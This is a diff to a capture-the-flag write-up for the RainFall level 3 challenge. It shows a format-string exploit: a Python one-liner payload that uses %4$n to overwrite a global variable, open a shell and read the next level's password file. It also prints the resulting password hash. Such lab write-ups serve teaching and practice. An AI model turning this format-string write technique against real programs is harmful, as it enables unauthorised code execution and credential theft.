@@ -1,6 +1,6 @@
 # Level 3
 
-In this level we can see that we need to edit the value of the variable `m` to `0x40` in order to get a shellh
+In this level we can see that we need to edit the value of the variable `m` to `0x40` in order to get a shell.
 ```asm
    0x080484da <+54>:    mov    0x804988c,%eax
    0x080484df <+59>:    cmp    $0x40,%eax
@@ -36,9 +36,9 @@ level3@RainFall:~$ objdump -t ./level3  | grep m
 0804988c g     O .bss   00000004              m
 [...]
 ```
-the value of `m` is `0x804988c`, we can get it from `gdb`, `r2` or `objdump`
+the value of `m` is `0x804988c`, we can get it from `gdb`, `r2`, `objdump` or ghidra.
 
-let's insert it as a value
+Let's insert it as a value.
 ```shell
 level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "%4$p"'`
 0x804988c
@@ -62,8 +62,7 @@ We won! we just need to find a way to keep the shell open now.
 We can add `"A"*4028` followed with our glorious command to get the password, it is just a way to wait until the shell is ready to read from stdin again.
 
 ```shell
-level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4
-$n" + "A"*4028 + "cat /home/user/level4/.pass"'`
+level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n" + "A"*4028 + "cat /home/user/level4/.pass"'`
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWait what?!
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
